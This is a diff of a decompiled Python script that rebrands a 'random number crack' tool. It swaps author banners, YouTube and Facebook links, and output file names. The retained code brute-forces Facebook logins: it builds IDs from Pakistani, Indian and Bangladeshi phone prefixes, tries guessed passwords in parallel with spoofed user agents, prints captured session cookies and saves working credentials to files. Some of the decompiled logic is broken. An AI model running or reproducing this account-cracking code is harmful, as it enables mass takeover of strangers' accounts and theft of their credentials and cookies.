@@ -1,4 +1,6 @@
- 
+# Source Generated with Decompyle++
+# File: test.pyc (Python 3.9)
+
 import os
 import sys
 import time
@@ -7,39 +9,22 @@ import uuid
 os.system('git pull')
 os.system('pkg install curl')
 
-logo = ("""\033[132m
-\033[1;32m╔══════════════════════════════════════════════════════════╗\033[1;93m
-\033[1;32m║	         \033[1;93m ─━㋱ASSALAMUALAIKUM㋱━─\033[1;32m	           ║
-\033[1;32m╔══════════════════════════════════════════════════════════╗
-\033[1;32m║      \033[1;93m __  ___     _____ __  ________  _____    ____\033[1;32m      ║
-\033[1;32m║     \033[1;93m /  |/  /____/ ___// / / /  _/ / / /   |  / __ )\033[1;32m     ║
-\033[1;32m║    \033[1;93m / /|_/ / ___/\__ \/ /_/ // // /_/ / /| | / __  | \033[1;32m    ║
-\033[1;32m║   \033[1;93m / /  / / /   ___/ / __  // // __  / ___ |/ /_/ /\033[1;32m      ║
-\033[1;32m║   \033[1;93m/_/  /_/_/   /____/_/ /_/___/_/ /_/_/  |_/_____/\033[1;32m       ║
-\033[1;32m╚══════════════════════════════════════════════════════════╝
-\033[1;32m╔══════════════════════════════════╗╔══════════════════════╗
-\033[1;32m║NOTE : \033[37;41mTHIS TOOLS IS FREE\033[0;m\033[1;32m         ║║        \x1b[1;91m___T_\033[1;32m         ║
-\033[1;32m║══════════════════════════════════║║       \x1b[1;91m| o o |\033[1;32m        ║
-\033[1;32m║AUTHOR    : Mr. SHIHAB            ║║       \x1b[1;91m|__-__|\033[1;32m        ║
-\033[1;32m║══════════════════════════════════║║       \x1b[1;91m/| []|'\033[1;32m        ║
-\033[1;32m║WHATSAPP  : +19376068835          ║║     \x1b[1;91m()/|___|\()\033[1;32m      ║
-\033[1;32m║══════════════════════════════════║║        \x1b[1;91m|_|_|\033[1;32m         ║
-\033[1;32m║GITHUB    : Mr-Shihab-Vau         ║║       \x1b[1;91m|_| |_|\033[1;32m        ║
-\033[1;32m║══════════════════════════════════║║                      ║
-\033[1;32m║SERVER    : DATA - WIFI WORKING   ║╚══════════════════════╝
-\033[1;32m║══════════════════════════════════════════════════════════╗
-\033[1;32m║FACEBOOK LINK : \x1b[1;91mhttps://www.facebook.com/Mr.C.E.O.SHIHAB\033[1;32m  ║
-\033[1;32m║══════════════════════════════════════════════════════════║
-\033[1;32m║FB PAGE LINK  : \x1b[1;91mhttps://www.facebook.com/Mr.SHIHAB.VAU\033[1;32m    ║
-\033[1;32m╚══════════════════════════════════════════════════════════╝\033[1;37m""")
+class jalan:
+    
+    def __init__(self, z):
+        pass
+
+
+logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;45mKASHIF\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mARYAN\x1b[0;m\x1b[1;32m && \x1b[1;33mKASHIF\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m ArYan KhAn\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-KRS\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mKRS\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;45mARYAN\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO KRS TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mNIDA\x1b[0;m ======================\n'
+
 def ud():
     os.system('clear')
     jalan(logo)
-    print(' \033[1;32m[1] SUBSCRIBE MY CHANNEL')
+    print(' [1] SUBSCRIBE MY CHANNEL')
     print(' [2] EXIT')
-    opt = input('\n   Choose option >>>\033[1;37m ')
+    opt = input('\n   Choose option >>> ')
     if opt == '1':
-        os.system('xdg-open https://youtube.com/channel/UCZPfRKcIH9Wf_sOZqb35FGQ')
+        os.system('xdg-open https://youtube.com/channel/UC7VzQau0F-tsOkRcksAmmxw')
         FD()
         return None
     None('\n\x1b[1;31mEXIT\x1b[0;97m')
@@ -48,11 +33,11 @@ def ud():
 def FD():
     os.system('clear')
     print(logo)
-    print('\x1b[1;33m [1] FOLLOW THIS MY FACEBOOK PAGE')
+    print('\x1b[1;33m [1] SUBSCRIBE MY FRND CHANNEL')
     print(' [2] EXIT')
     opt = input('\n  \x1b[1;32m Choose option >>> ')
     if opt == '1':
-        os.system('xdg-open https://www.facebook.com/Mr.SHIHAB.VAU/')
+        os.system('xdg-open https://youtube.com/channel/UC7VzQau0F-tsOkRcksAmmxw')
         o()
         return None
     None('\n\x1b[1;31mEXIT\x1b[0;97m')
@@ -61,26 +46,26 @@ def FD():
 def o():
     os.system('clear')
     jalan(logo)
-    jalan('\33[37;41m\t RANDOM NUMBER CRACK\33[0;m')
+    jalan('\tðŸ”¥ðŸ”¥RANDOM NUMBER CRACKðŸ”¥ðŸ”¥')
     print('')
     jalan('\x1b[1;32m [1]\x1b[1;33m RANDOM CRACK ')
     jalan('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON FACEBOOK')
     jalan(' \x1b[1;32m[3] \x1b[1;32mSUBSCRIBE MY CHANNEL')
-    jalan(' \x1b[1;32m[4] \x1b[1;32mFOLLOW FACEBOOK PAGE')
+    jalan(' \x1b[1;32m[4] \x1b[1;32mJOIN FB GROUP')
     jalan(' \x1b[1;32m[00] \x1b[1;31mEXIT')
     opt = input('\n   \x1b[1;32m Choose option >>> ')
     if opt == '1':
         i()
-    if opt == '2':
-        os.system('xdg-open https://www.facebook.com/Mr.C.E.O.SHIHAB')
+    if None == '2':
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100084811923051')
         return None
-    if opt == '3':
-        os.system('xdg-open https://youtube.com/channel/UCZPfRKcIH9Wf_sOZqb35FGQ')
+    if None == '3':
+        os.system('xdg-open https://youtube.com/channel/UC7VzQau0F-tsOkRcksAmmxw')
         return None
-    if opt == '4':
-        os.system('xdg-open https://www.facebook.com/Mr.SHIHAB.VAU/')
+    if None == '4':
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100084811923051/')
         return None
-    if opt == '0':
+    if None == '0':
         os.system('exit')
         return None
     None('\n\x1b[1;31m  Choose valid option\x1b[0;97m')
@@ -179,31 +164,27 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-logo = ("""\033[132m
-\033[1;32m╔══════════════════════════════════════════════════════════╗\033[1;93m
-\033[1;32m║	         \033[1;93m ─━㋱ASSALAMUALAIKUM㋱━─\033[1;32m	           ║
-\033[1;32m╔══════════════════════════════════════════════════════════╗
-\033[1;32m║      \033[1;93m __  ___     _____ __  ________  _____    ____\033[1;32m      ║
-\033[1;32m║     \033[1;93m /  |/  /____/ ___// / / /  _/ / / /   |  / __ )\033[1;32m     ║
-\033[1;32m║    \033[1;93m / /|_/ / ___/\__ \/ /_/ // // /_/ / /| | / __  | \033[1;32m    ║
-\033[1;32m║   \033[1;93m / /  / / /   ___/ / __  // // __  / ___ |/ /_/ /\033[1;32m      ║
-\033[1;32m║   \033[1;93m/_/  /_/_/   /____/_/ /_/___/_/ /_/_/  |_/_____/\033[1;32m       ║
-\033[1;32m╚══════════════════════════════════════════════════════════╝
-\033[1;32m╔══════════════════════════════════╗╔══════════════════════╗
-\033[1;32m║NOTE : \033[37;41mTHIS TOOLS IS FREE\033[0;m\033[1;32m         ║║        \x1b[1;91m___T_\033[1;32m         ║
-\033[1;32m║══════════════════════════════════║║       \x1b[1;91m| o o |\033[1;32m        ║
-\033[1;32m║AUTHOR    : Mr. SHIHAB            ║║       \x1b[1;91m|__-__|\033[1;32m        ║
-\033[1;32m║══════════════════════════════════║║       \x1b[1;91m/| []|'\033[1;32m        ║
-\033[1;32m║WHATSAPP  : +19376068835          ║║     \x1b[1;91m()/|___|\()\033[1;32m      ║
-\033[1;32m║══════════════════════════════════║║        \x1b[1;91m|_|_|\033[1;32m         ║
-\033[1;32m║GITHUB    : Mr-Shihab-Vau         ║║       \x1b[1;91m|_| |_|\033[1;32m        ║
-\033[1;32m║══════════════════════════════════║║                      ║
-\033[1;32m║SERVER    : DATA - WIFI WORKING   ║╚══════════════════════╝
-\033[1;32m║══════════════════════════════════════════════════════════╗
-\033[1;32m║FACEBOOK LINK : \x1b[1;91mhttps://www.facebook.com/Mr.C.E.O.SHIHAB\033[1;32m  ║
-\033[1;32m║══════════════════════════════════════════════════════════║
-\033[1;32m║FB PAGE LINK  : \x1b[1;91mhttps://www.facebook.com/Mr.SHIHAB.VAU\033[1;32m    ║
-\033[1;32m╚══════════════════════════════════════════════════════════╝\033[1;37m\n""")
+logo =                                          ("""   
+\033[1;32m      ___   __    __       __      ___      ___            __      
+\033[1;35m     |"  | /" |  | "\     /""\    |"  |    |"  |          /""\     
+\033[1;35m     ||  |(:  (__)  :)   /    \   ||  |    ||  |         /    \    
+\033[1;32m     |:  | \/      \/   /' /\  \  |:  |    |:  |        /' /\  \   
+\033[1;32m  ___|  /  //  __  \\  //  __'  \  \  |___  \  |___    //  __'  \  
+\033[1;35m /  :|_/ )(:  (  )  :)/   /  \\  \( \_|:  \( \_|:  \  /   /  \\  \ 
+\033[1;35m(_______/  \__|  |__/(___/    \___)\_______)\_______)(___/    \___)
+\033[1;32m                  🤞LEGEND 9T7 ADMIN🤞
+\033[1;37m================= \33[32;45mALONE TOPPER\33[0;m =====================
+\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mJHALLA\33[0;m\033[1;32m && \033[1;33mJHALLA\33[0;m
+\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m ABU BAKAR
+\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mJHALLA33
+\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
+\033[1;32m     \033[1;35mTEAM         :  \033[1;35m9T7
+\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
+\033[1;37m================= \33[32;45mALONE TOPPER\33[0;m =====================
+ 
+       \33[37;41m\t WELLCOME TO LEGEND 9T7 TOOL\33[0;m
+ 
+\033[1;37m================== \33[32;45mBRAND\33[0;m ======================\n""")
 loop = 0
 oks = []
 cps = []
@@ -236,14 +217,14 @@ def dynamic(text):
     titik = ['.   ','..  ','... ','.... ']
     for o in titik:
         print('\r'+text+o),
-        sys.stdout.flush();time.sleep(1) 
+        sys.stdout.flush();time.sleep(1)
  
 #User agents
 ugen2=[]
 ugen=[]
  
 for xd in range(10000):
-    aa='Mozilla/5.0 (Linux; U; Android'
+    aa='Mozilla/5.0 (Android ; Mobile'
     b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
     c=' en-us; GT-'
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -268,14 +249,13 @@ def i():
     jalan(logo)
     
     
-    jalan("	\33[37;41m\t  USE OUR COUNTRY CODE  \33[0;m")
-    print('')
-    jalan('\033[1;36m  PAK  CODES  :  \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
-    jalan('\033[1;32m ══════════════════════════════════════════════════════════')
-    jalan('\033[1;36m  INDIA CODES :  \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
-    jalan('\033[1;32m ══════════════════════════════════════════════════════════')
-    jalan('\033[1;36m  BD CODES    :  \033[1;33m88016, \033[1;33m88017 ,\033[1;33m88018 ,\033[1;33m88019  ...\033[0;97m')
-    jalan('\033[1;32m ══════════════════════════════════════════════════════════\n')
+    jalan("\033[1;37m\t  USE OUR COUNTRY CODE  ")
+    jalan('\033[1;36m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
+    jalan('\033[1;32m============================================')
+    jalan('\033[1;36m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
+    jalan('\033[1;32m============================================')
+    jalan('\033[1;36m     \t     BD CODES\n     \033[1;33m88016, \033[1;33m88017 ,\033[1;33m88018 ,\033[1;33m88019  ...\033[0;97m')
+    jalan('\033[1;32m============================================\n')
     code = input(' PUT CODE : ')
     print("")
     limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
@@ -295,18 +275,18 @@ def i():
         tl = str(len(user))
         print('\033[1;36m TOTAL IDS: '+tl)
         print('\033[1;36m THE PROCESS HAS BEEN STARTED')
-        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 5 MIN ')
-        print('\033[1;32m ══════════════════════════════════════════════════════════')
+        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 4 MIN ')
+        print('\033[1;32m============================================')
         for love in user:
             pwx = [love[1:]]
             uid = code+love
             for Eman in HamiiID:
                 pwx.append(Eman)
             manshera.submit(rcrack,uid,pwx,tl)
-    print('\033[1;32m ══════════════════════════════════════════════════════════')
+    print('\033[1;32m============================================')
     print('Crack process has been completed')
     print('Ids saved in ok.txt,cp.txt')
-    print('\033[1;32m ══════════════════════════════════════════════════════════')
+    print('\033[1;32m============================================')
  
 def rcrack(uid,pwx,tl):
     #print(user)
@@ -354,22 +334,22 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('    \033[1;32m(Mr SHIHAB-OK😍)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(JHALLA)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/Mr SHIHAB-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/JHALLA-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('    \33[1;30m(Mr SHIHAB-CP🥺)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/Mr SHIHAB-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                print('    \33[1;30m(JHALLA•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/JHALLA-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(' %s[Mr SHIHAB] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r     %s[JHALLA] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
